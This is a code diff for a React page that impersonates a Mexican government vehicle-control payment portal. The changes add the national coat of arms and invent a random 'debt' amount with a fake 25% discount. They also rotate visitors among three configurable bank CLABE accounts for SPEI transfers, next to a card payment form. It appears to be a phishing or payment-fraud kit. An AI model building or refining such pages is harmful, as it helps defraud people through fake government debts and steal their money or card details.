@@ -1,5 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useState } from "react";
+import { useState, useMemo } from "react";
+import logoMx from "@/assets/logo-mx.png";
 import {
   Car,
   Mail,
@@ -44,9 +45,18 @@ type Screen =
   | "card"
   | "spei";
 
-const ORIGINAL = 3669;
-const TOTAL = +(ORIGINAL * 0.75).toFixed(2); // 2751.75 -> rounded display 2752
-const SAVINGS = ORIGINAL - TOTAL;
+// === CLABES configurables: edita estos 3 valores. Se mostrara 1 aleatoria. ===
+const CLABES: { banco: string; clabe: string }[] = [
+  { banco: "BBVA Mexico", clabe: "012 180 01234567890 1" },
+  { banco: "Banamex", clabe: "002 180 09876543210 5" },
+  { banco: "Santander", clabe: "014 180 11223344556 7" },
+];
+
+const randomAmount = () => {
+  // Monto original aleatorio entre $1000.00 y $5000.00
+  const n = Math.random() * 4000 + 1000;
+  return Math.round(n * 100) / 100;
+};
 
 const fmt = (n: number) =>
   "$" +
@@ -54,11 +64,15 @@ const fmt = (n: number) =>
 
 function Index() {
   const [screen, setScreen] = useState<Screen>("landing");
+  const original = useMemo(() => randomAmount(), []);
+  const total = useMemo(() => Math.round(original * 0.75 * 100) / 100, [original]);
+  const savings = useMemo(() => Math.round((original - total) * 100) / 100, [original, total]);
+  const clabe = useMemo(() => CLABES[Math.floor(Math.random() * CLABES.length)], []);
 
   return (
     <div className="min-h-screen bg-background text-foreground flex flex-col">
       <TopBar />
-      <Header onHome={() => setScreen("landing")} />
+      <Header onHome={() => setScreen("landing")} screen={screen} />
       <main className="flex-1">
         {screen === "landing" && (
           <Landing
@@ -69,7 +83,14 @@ function Index() {
           screen === "confirm" ||
           screen === "card" ||
           screen === "spei") && (
-          <FlowPage screen={screen} setScreen={setScreen} />
+          <FlowPage
+            screen={screen}
+            setScreen={setScreen}
+            original={original}
+            total={total}
+            savings={savings}
+            clabe={clabe}
+          />
         )}
       </main>
       <Footer />
@@ -101,7 +122,8 @@ function TopBar() {
             <Phone className="h-3 w-3" /> 800-CONTROL
           </span>
           <span className="hidden sm:flex items-center gap-1">
-            <Mail className="h-3 w-3" /> contacto@controlvehicular.gob.mx
+            <Mail className="h-3 w-3" />
+            <span>contacto@controlvehicular.gob.mx</span>
           </span>
         </div>
       </div>
@@ -110,7 +132,8 @@ function TopBar() {
 }
 
 /* -------- Header -------- */
-function Header({ onHome }: { onHome: () => void }) {
+function Header({ onHome, screen }: { onHome: () => void; screen: Screen }) {
+  const useMxLogo = screen === "search" || screen === "confirm" || screen === "card" || screen === "spei";
   return (
     <header className="bg-[var(--burgundy)] text-white">
       <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
@@ -118,9 +141,17 @@ function Header({ onHome }: { onHome: () => void }) {
           onClick={onHome}
           className="flex items-center gap-3 text-left"
         >
-          <div className="h-12 w-12 rounded-full bg-white/10 flex items-center justify-center ring-2 ring-white/30">
-            <Car className="h-6 w-6" />
-          </div>
+          {useMxLogo ? (
+            <img
+              src={logoMx}
+              alt="Escudo Estados Unidos Mexicanos"
+              className="h-16 w-auto object-contain"
+            />
+          ) : (
+            <div className="h-12 w-12 rounded-full bg-white/10 flex items-center justify-center ring-2 ring-white/30">
+              <Car className="h-6 w-6" />
+            </div>
+          )}
           <div>
             <div className="text-lg font-bold leading-tight">Control Vehicular</div>
             <div className="text-[11px] opacity-80 leading-tight">
@@ -581,9 +612,17 @@ function CaptchaModal({
 function FlowPage({
   screen,
   setScreen,
+  original,
+  total,
+  savings,
+  clabe,
 }: {
   screen: Screen;
   setScreen: (s: Screen) => void;
+  original: number;
+  total: number;
+  savings: number;
+  clabe: { banco: string; clabe: string };
 }) {
   const stepNum =
     screen === "search" ? 1 : screen === "confirm" ? 2 : 3;
@@ -605,13 +644,16 @@ function FlowPage({
             <ConfirmCard
               onCard={() => setScreen("card")}
               onSpei={() => setScreen("spei")}
+              original={original}
+              total={total}
+              savings={savings}
             />
           )}
           {screen === "card" && (
-            <CardPayment onBack={() => setScreen("confirm")} />
+            <CardPayment onBack={() => setScreen("confirm")} total={total} />
           )}
           {screen === "spei" && (
-            <SpeiPayment onBack={() => setScreen("confirm")} />
+            <SpeiPayment onBack={() => setScreen("confirm")} total={total} clabe={clabe} />
           )}
         </div>
       </div>
@@ -711,9 +753,15 @@ function SearchCard({ onNext }: { onNext: () => void }) {
 function ConfirmCard({
   onCard,
   onSpei,
+  original,
+  total,
+  savings,
 }: {
   onCard: () => void;
   onSpei: () => void;
+  original: number;
+  total: number;
+  savings: number;
 }) {
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-6">
@@ -748,10 +796,10 @@ function ConfirmCard({
           25% en su pago.
         </p>
         <div className="flex flex-wrap items-center gap-3">
-          <span className="text-muted-foreground line-through">{fmt(ORIGINAL)}</span>
-          <span className="text-3xl font-bold text-[var(--burgundy)]">{fmt(TOTAL)}</span>
+          <span className="text-muted-foreground line-through">{fmt(original)}</span>
+          <span className="text-3xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
           <span className="bg-[var(--burgundy)] text-white text-xs font-semibold rounded-full px-3 py-1">
-            Ahorro {fmt(SAVINGS)}
+            Ahorro {fmt(savings)}
           </span>
         </div>
         <div className="mt-3 flex items-center gap-2 text-xs text-amber-700">
@@ -765,7 +813,7 @@ function ConfirmCard({
           Total del Adeudo (con 25% descuento)
         </div>
         <div className="text-4xl font-bold text-[var(--burgundy)] mt-1">
-          {fmt(TOTAL)}
+          {fmt(total)}
         </div>
       </div>
 
@@ -799,9 +847,9 @@ function DataField({ label, value }: { label: string; value: string }) {
 }
 
 /* -------- Payment screens -------- */
-function CardPayment({ onBack }: { onBack: () => void }) {
+function CardPayment({ onBack, total }: { onBack: () => void; total: number }) {
   const [done, setDone] = useState(false);
-  if (done) return <PaymentSuccess method="Tarjeta" />;
+  if (done) return <PaymentSuccess method="Tarjeta" total={total} />;
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-5">
       <button
@@ -816,7 +864,7 @@ function CardPayment({ onBack }: { onBack: () => void }) {
       </div>
       <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
         <span>Total a pagar</span>
-        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(TOTAL)}</span>
+        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
       </div>
       <form
         onSubmit={(e) => {
@@ -835,14 +883,22 @@ function CardPayment({ onBack }: { onBack: () => void }) {
           type="submit"
           className="w-full bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-3 rounded-md"
         >
-          Pagar {fmt(TOTAL)}
+          Pagar {fmt(total)}
         </button>
       </form>
     </div>
   );
 }
 
-function SpeiPayment({ onBack }: { onBack: () => void }) {
+function SpeiPayment({
+  onBack,
+  total,
+  clabe,
+}: {
+  onBack: () => void;
+  total: number;
+  clabe: { banco: string; clabe: string };
+}) {
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-5">
       <button
@@ -857,12 +913,12 @@ function SpeiPayment({ onBack }: { onBack: () => void }) {
       </div>
       <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
         <span>Monto exacto a transferir</span>
-        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(TOTAL)}</span>
+        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
       </div>
       <div className="space-y-3 text-sm">
         <Row label="Beneficiario" value="Secretaria de Finanzas" />
-        <Row label="Banco" value="BBVA Mexico" />
-        <Row label="CLABE Interbancaria" value="012 180 01234567890 1" />
+        <Row label="Banco" value={clabe.banco} />
+        <Row label="CLABE Interbancaria" value={clabe.clabe} />
         <Row label="Concepto" value="ABC1234L4N" />
         <Row label="Referencia" value="2026051200001" />
       </div>
@@ -894,7 +950,7 @@ function Field({ label, placeholder }: { label: string; placeholder: string }) {
   );
 }
 
-function PaymentSuccess({ method }: { method: string }) {
+function PaymentSuccess({ method, total }: { method: string; total: number }) {
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-8 text-center">
       <div className="mx-auto h-16 w-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mb-4">
@@ -902,7 +958,7 @@ function PaymentSuccess({ method }: { method: string }) {
       </div>
       <h2 className="text-2xl font-bold">Pago Exitoso</h2>
       <p className="text-muted-foreground mt-2">
-        Su pago de {fmt(TOTAL)} con {method} ha sido procesado correctamente.
+        Su pago de {fmt(total)} con {method} ha sido procesado correctamente.
       </p>
       <p className="text-sm text-muted-foreground mt-4">
         Folio: <span className="font-mono font-semibold">ABC1234L4N</span>
